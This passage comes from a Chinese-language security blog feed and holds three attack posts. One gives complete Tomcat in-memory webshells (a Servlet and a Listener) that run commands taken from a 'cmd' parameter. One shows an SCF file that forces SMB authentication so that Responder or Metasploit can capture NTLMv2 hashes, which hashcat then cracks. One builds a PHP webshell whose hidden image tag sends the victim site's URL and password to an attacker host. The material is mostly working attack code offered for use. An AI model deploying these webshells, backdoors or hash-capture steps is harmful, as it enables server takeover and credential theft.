class="hljs-keyword">null</span>;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String cmd = servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            Process process = Runtime.getRuntime().exec(cmd);<br>            java.io.BufferedReader bufferedReader = <span class="hljs-keyword">new</span> java.io.BufferedReader(<br>                    <span class="hljs-keyword">new</span> java.io.InputStreamReader(process.getInputStream()));<br>            StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                stringBuilder.append(line + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>            &#125;<br>            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());<br>            servletResponse.getOutputStream().flush();<br>            servletResponse.getOutputStream().close();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="动态注册部分-1"><a href="#动态注册部分-1" class="headerlink" title="动态注册部分"></a>动态注册部分</h3><p>获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ServletContext servletContext =  request.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;<br>Field appctx = servletContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>appctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br>Field stdctx = applicationContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>stdctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><p>然后这次需要将上文写的servlet封装成wrapper再使用context添加</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//将恶意servlet封装成<span class="hljs-keyword">wrapper</span>添加到StandardContext的children当中<br>ServletDemo demo = <span class="hljs-built_in">new</span> ServletDemo();<br>org.apache.catalina.<span class="hljs-keyword">Wrapper</span> demoWrapper = standardContext.createWrapper();<br>demoWrapper.setName(&quot;xyz&quot;);<br>demoWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>demoWrapper.setServlet(demo);<br>demoWrapper.setServletClass(demo.getClass().getName());<br>standardContext.addChild(demoWrapper);<br><br>//设置ServletMap将访问的URL和<span class="hljs-keyword">wrapper</span>进行绑定<br>standardContext.addServletMapping(&quot;/xyz&quot;, &quot;xyz&quot;);<br><span class="hljs-keyword">out</span>.println(&quot;inject servlet success!&quot;);<br></code></pre></td></tr></table></figure><p>servlet型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的url才能触发</p><h3 id="完整内存马-1"><a href="#完整内存马-1" class="headerlink" title="完整内存马"></a>完整内存马</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; <span class="hljs-keyword">language</span>=&quot;java&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = &quot;org.apache.catalina.core.ApplicationContext&quot;%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = &quot;org.apache.catalina.core.StandardContext&quot;%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = &quot;javax.servlet.*&quot;%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = &quot;java.io.IOException&quot;%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = &quot;java.lang.reflect.Field&quot;%&gt;<br><br><br>&lt;%<br>    <span class="hljs-keyword">class</span> ServletDemo implements Servlet&#123;<br>        @Override<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(ServletConfig config) throws ServletException &#123;&#125;<br>        @Override<br>        <span class="hljs-built_in">public</span> String getServletInfo() &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;<br>        @Override<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;&#125;    <span class="hljs-built_in">public</span> ServletConfig getServletConfig() &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;<br><br>        @Override<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;<br>            String cmd = servletRequest.getParameter(&quot;cmd&quot;);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>                Process process = Runtime.getRuntime().exec(cmd);<br>                java.io.BufferedReader bufferedReader = <span class="hljs-built_in">new</span> java.io.BufferedReader(<br>                        <span class="hljs-built_in">new</span> java.io.InputStreamReader(process.getInputStream()));<br>                StringBuilder stringBuilder = <span class="hljs-built_in">new</span> StringBuilder();<br>                String <span class="hljs-type">line</span>;<br>                <span class="hljs-keyword">while</span> ((<span class="hljs-type">line</span> = bufferedReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                    stringBuilder.append(<span class="hljs-type">line</span> + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>                &#125;<br>                servletResponse.getOutputStream().<span class="hljs-keyword">write</span>(stringBuilder.toString().getBytes());<br>                servletResponse.getOutputStream().flush();<br>                servletResponse.getOutputStream().<span class="hljs-keyword">close</span>();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br><br><br>&lt;%<br>    ServletContext servletContext =  request.getSession().getServletContext();<br>    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class="hljs-keyword">get</span>(servletContext);<br>    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    StandardContext standardContext = (StandardContext) stdctx.<span class="hljs-keyword">get</span>(applicationContext);<br>    ServletDemo demo = <span class="hljs-built_in">new</span> ServletDemo();<br>    org.apache.catalina.<span class="hljs-keyword">Wrapper</span> demoWrapper = standardContext.createWrapper();<br><br>//设置Servlet名等<br>    demoWrapper.setName(&quot;xyz&quot;);<br>    demoWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    demoWrapper.setServlet(demo);<br>    demoWrapper.setServletClass(demo.getClass().getName());<br>    standardContext.addChild(demoWrapper);<br><br>//设置ServletMap<br>    standardContext.addServletMapping(&quot;/xyz&quot;, &quot;xyz&quot;);<br>    <span class="hljs-keyword">out</span>.println(&quot;inject servlet success!&quot;);<br>%&gt;<br></code></pre></td></tr></table></figure><p>使用示例</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/servlet01.png"></p><p>如果在当前web根目录则不需要寻找上一级目录</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/servlet02.png"></p><h2 id="Listener型内存马原理"><a href="#Listener型内存马原理" class="headerlink" title="Listener型内存马原理"></a>Listener型内存马原理</h2><p>Listener是javaweb中的监听器，监听某一个java对象的方法调用或属性改变，当被监听对象发生上述事件后，监听器某个方法立即被执行。</p><p>Listener内存马是通过动态注册一个Listener，其监听到某个参数传入时，则将参数用于命令执行，由于是动态注册的，所以这个Listener没有文件实体，存在于内存中，随着tomcat重启而消失。</p><h2 id="Listener型内存马实现"><a href="#Listener型内存马实现" class="headerlink" title="Listener型内存马实现"></a>Listener型内存马实现</h2><h3 id="Listener部分"><a href="#Listener部分" class="headerlink" title="Listener部分"></a>Listener部分</h3><p>一个简单的HttpServletRequestListener示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Initialized.&quot;</span>);<br>            &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Destroyed.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Listener中，我们需要在初始化操作contextInitialized中填入恶意代码</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span> <span class="hljs-title">implements</span> <span class="hljs-title">ServletRequestListener</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">requestDestroyed</span>(<span class="hljs-params">ServletRequestEvent servletRequestEvent</span>)</span> &#123;<br>        <br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">requestInitialized</span>(<span class="hljs-params">ServletRequestEvent servletRequestEvent</span>)</span> &#123;<br>        <span class="hljs-built_in">String</span> cmd = servletRequestEvent.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="动态注册部分-2"><a href="#动态注册部分-2" class="headerlink" title="动态注册部分"></a>动态注册部分</h3><p>获取context部分</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ServletContext servletContext =  request.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;<br>Field appctx = servletContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>appctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br>Field stdctx = applicationContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>stdctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><p>添加Listener</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">S servletRequestListener = <span class="hljs-keyword">new</span> <span class="hljs-constructor">S()</span>;<br>standardContext.add<span class="hljs-constructor">ApplicationEventListener(<span class="hljs-params">servletRequestListener</span>)</span>;<br></code></pre></td></tr></table></figure><h3 id="完整内存马-2"><a href="#完整内存马-2" class="headerlink" title="完整内存马"></a>完整内存马</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attribute">language</span>=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br><br>&lt;%<br>class S implements ServletRequestListener&#123;<br>    @Override<br>    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;<br>        <br>    &#125;<br>    @Override<br>    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;<br>        String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>            try &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; catch (IOException e) &#123;&#125;<br>        &#125;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;%<br>ServletContext servletContext =  request.getSession().getServletContext();<br>Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br>ApplicationContext applicationContext = (ApplicationContext) appctx.<span class="hljs-builtin-name">get</span>(servletContext);<br>Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>StandardContext standardContext = (StandardContext) stdctx.<span class="hljs-builtin-name">get</span>(applicationContext);<br>S servletRequestListener = new S();<br>standardContext.addApplicationEventListener(servletRequestListener);<br>out.println(<span class="hljs-string">&quot;inject success&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>使用示例</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/listener01.png"></p><p>如果在当前web根目录则不需要寻找上一级目录</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/listener02.png"></p>]]></content>
    
    
    <categories>
      
      <category>webshell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用强制smb身份验证获取用户哈希</title>
    <link href="/2021/06/27/%E5%88%A9%E7%94%A8%E5%BC%BA%E5%88%B6smb%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C/"/>
    <url>/2021/06/27/%E5%88%A9%E7%94%A8%E5%BC%BA%E5%88%B6smb%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻击者可通过向共享目录投递连接外部服务器的资源文件，用户请求过程中尝试身份验证，会默认使用SMB协议将用户哈希发送到服务器，这样攻击者就会获取对方用户账户哈希。</p><h2 id="创建共享目录scf文件"><a href="#创建共享目录scf文件" class="headerlink" title="创建共享目录scf文件"></a>创建共享目录scf文件</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Shell]</span><br><span class="hljs-attr">Command</span>=<span class="hljs-number">2</span><br><span class="hljs-attr">IconFile</span>=\\X.X.X.X\share\<span class="hljs-number">1</span>.ico<br><span class="hljs-section">[Taskbar]</span><br><span class="hljs-attr">Command</span>=ToggleDesktop<br></code></pre></td></tr></table></figure><p>重命名后缀为.scf，保存在共享目录</p><h2 id="使用responder接收哈希"><a href="#使用responder接收哈希" class="headerlink" title="使用responder接收哈希"></a>使用responder接收哈希</h2><p>使用responder开启监听</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/lgandx/Responder.git<br><span class="hljs-keyword">python</span> Responder.<span class="hljs-keyword">py</span> -wrf --<span class="hljs-keyword">lm</span> -v -I eth0<br></code></pre></td></tr></table></figure><p>使用任一用户访问刚才建立好的共享目录，只要进入到保存有.scf这一文件的层级就会触发smb身份验证，responder会监听到NTLMv2哈希</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/smb/smb01.png"></p><h2 id="使用msf模块接收哈希"><a href="#使用msf模块接收哈希" class="headerlink" title="使用msf模块接收哈希"></a>使用msf模块接收哈希</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/<span class="hljs-keyword">capture</span>/smb<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><h2 id="使用hashcat配合字典来破解"><a href="#使用hashcat配合字典来破解" class="headerlink" title="使用hashcat配合字典来破解"></a>使用hashcat配合字典来破解</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">5600</span> Administrator::NEXT:b<span class="hljs-number">36</span>ff<span class="hljs-number">0</span>a<span class="hljs-number">87</span>f<span class="hljs-number">24</span>a<span class="hljs-number">5</span>b<span class="hljs-number">2</span>:<span class="hljs-number">59</span>D<span class="hljs-number">4</span>E<span class="hljs-number">07</span>C<span class="hljs-number">55717</span>C<span class="hljs-number">42</span>B<span class="hljs-number">167</span>E<span class="hljs-number">2</span>FF<span class="hljs-number">178</span>C<span class="hljs-number">0</span>B<span class="hljs-number">83</span>:<span class="hljs-number">01010000000000005</span>D<span class="hljs-number">83</span>AE<span class="hljs-number">7</span>CFE<span class="hljs-number">67</span>D<span class="hljs-number">701</span>B<span class="hljs-number">33</span>B<span class="hljs-number">25</span>F<span class="hljs-number">625134</span>A<span class="hljs-number">1</span>E<span class="hljs-number">00000000020000000000000000000000</span> /root/pass.txt --force<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/smb/smb02.png"></p>]]></content>
    
    
    <categories>
      
      <category>钓鱼</category>
      
    </categories>
    
    
    <tags>
      
      <tag>smb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>带后门webshell制作</title>
    <link href="/2021/06/18/%E5%B8%A6%E5%90%8E%E9%97%A8webshell%E5%88%B6%E4%BD%9C/"/>
    <url>/2021/06/18/%E5%B8%A6%E5%90%8E%E9%97%A8webshell%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>多年前直接拿别人的免杀webshell或者大马使用时，经常会遇到在木马里留后门的情况，这种木马对我们自身机器没有什么危害，但是在我们使用的时候，上传webshell的地址与连接密码会被木马作者获取。</p><p>简单的说就是你的shell就是我的shell，被窃取劳动成果还是很不爽的。</p><p>所以本文打算把webshell后门的制作的办法总结一篇文档，以后面对这些木马就更知己知彼，有办法给它把后门去掉。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>webshell后门的目标就是为了窃取我们上传了webshell的网站和路径，在密码可随意修改的情况下最好也知道你的连接密码。</p><p>后门需要做的就是将这两部分信息发送给我们接收信息的服务器，使用php脚本发送信息的方式非常多，但是这里常见的方式是通过js链接的方式携带这些信息访问服务，或者通过php某些发送请求的函数进行发送。</p><p>比如</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&lt;<span class="hljs-variable">img</span> <span class="hljs-variable">src</span>=<span class="hljs-variable">http</span>:<span class="hljs-comment">//xx.xx.xx.xx/&gt;</span><br><span class="hljs-function"><span class="hljs-title">fopen</span>()</span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span>()</span><br><span class="hljs-variable">curl</span><br></code></pre></td></tr></table></figure><h2 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h2><h3 id="临时接收"><a href="#临时接收" class="headerlink" title="临时接收"></a>临时接收</h3><p>最简单的例子就是临时开启python的http服务，将上文提到的两部分信息放在img src中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_11</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=http://xx.xx.xx.xx:8000/url=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;&amp;passwd=&quot;</span>.<span class="hljs-variable">$_00</span>.<span class="hljs-string">&quot;&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用浏览器访问webshell文件的时候，js会自动将信息拼接起来get请求http server，在开启的http server的日志中可以清晰看到webshell网址和连接密码。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php01.png"></p><p>但是这种粗鄙的方式只适用于随手给出去木马然后开个临时的server监听</p><p>如果要投放出自己的webshell，让它自由传播慢慢等待记录这些数据就得搭建专门的接收平台。</p><h3 id="使用在线平台接收"><a href="#使用在线平台接收" class="headerlink" title="使用在线平台接收"></a>使用在线平台接收</h3><p>可使用在线的一些网址来接收requests请求，有效的防止被人定位自己服务器</p><p>如</p><p><a href="https://request.worktile.com/">https://request.worktile.com/</a></p><p>只需获取一个随机的url，然后添加进一句话木马中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_11</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=https://request.worktile.com/NsMjXjQqj?url=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;&amp;passwd=&quot;</span>.<span class="hljs-variable">$_00</span>.<span class="hljs-string">&quot;&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传并访问webshell，得到结果</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php02.png"></p><h3 id="搭建xssplatform接收"><a href="#搭建xssplatform接收" class="headerlink" title="搭建xssplatform接收"></a>搭建xssplatform接收</h3><p>搭建xssplatform</p><p>xssplatform默认会接收http referer，并且选择创建默认配置时，参数有location等，可以直接使用其作为webshell后门的接收平台</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php03.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 